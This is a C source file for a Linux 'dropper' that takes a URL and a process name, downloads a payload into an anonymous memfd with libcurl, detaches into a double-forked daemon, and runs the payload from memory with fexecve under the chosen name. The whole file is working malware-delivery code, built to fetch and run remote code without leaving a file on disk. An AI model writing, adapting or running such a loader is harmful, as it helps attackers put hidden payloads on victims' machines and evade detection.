/* Implementation of Dropper in C */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>  
#include <string.h> 
#include <signal.h>
#include <sys/mman.h>
#include <curl/curl.h>
#include <sys/stat.h>

int create_memfd(char* fd_name){
    int fd;
    printf("[+] Creating memfd\n");
    fd = memfd_create(fd_name, 0);
    if (fd == -1) {
        perror("memfd_create\n");
        exit(0);
    }
    printf("[+] fd is %d\n", fd);
    return fd;
}


void write_file(char* url, char* filepath) {
    CURL *curl;
    FILE *fp;
    CURLcode res;
    char outfilename[100];
    strcpy(outfilename, filepath);

    curl = curl_easy_init();                                                                                                                                                                                                                                                           
    if (curl) {   
        fp = fopen(outfilename,"wb");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1L);
        
        /* Make Request */
        res = curl_easy_perform(curl);

        /* Check for Errors */
        if (res != CURLE_OK | res == CURLE_HTTP_RETURNED_ERROR ) {
            fprintf(stderr, "Curl failed: %s\n", curl_easy_strerror(res));
            curl_easy_cleanup(curl);
            fclose(fp);
            exit(0);
        }
        curl_easy_cleanup(curl);
        fclose(fp);
    }   
    return;
}


void exec_fd(int fd, char* pname, char* evp[]){
    printf("[+] Executing file\n");

    /* First Fork */
    pid_t pid = fork();
    if (pid < 0)
        exit(EXIT_FAILURE);
    if (pid > 0)
        exit(EXIT_SUCCESS);

    /* The child process becomes session leader */
    if (setsid() < 0)
        exit(EXIT_FAILURE);

    /* Catch, ignore and handle signals */
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    /* Fork off for the second time*/
    pid = fork();
    if (pid < 0)
        exit(EXIT_FAILURE);
    if (pid > 0) {
        printf("[+] Process Spawned : %d\n", (int) pid);
        exit(EXIT_SUCCESS);
    }

    /* Set new file permissions */
    umask(0);
    chdir("/");
    
    /* Execute File in Daemon Process */
    char* p_argv[] = {pname, NULL};
    fexecve(fd, p_argv, evp);

    // This should not be hit :O
    return;
}


int main(int argc, char *argv[], char * envp[]){
    /* Define Vars */
    char* fd_name = "psovaya";
    int fd_num;
    char url[1024];
    char procname[128];
    char fd_path[128];
    char* usage = "Usage : ./dropper {url} {proc_name}\n";

    /* User Input */
    if (argc != 3) {
        printf("Error : Incorrect count of Arguements\n%s", usage);
        exit(0);
    }
    strcpy(url, argv[1]);
    strcpy(procname, argv[2]);

    /* Run Dropper */
    fd_num = create_memfd(fd_name);
    int j = snprintf(fd_path, 128, "/proc/self/fd/%d", fd_num);
    write_file(url, fd_path);
    exec_fd(fd_num, procname, envp);
    return 0;
}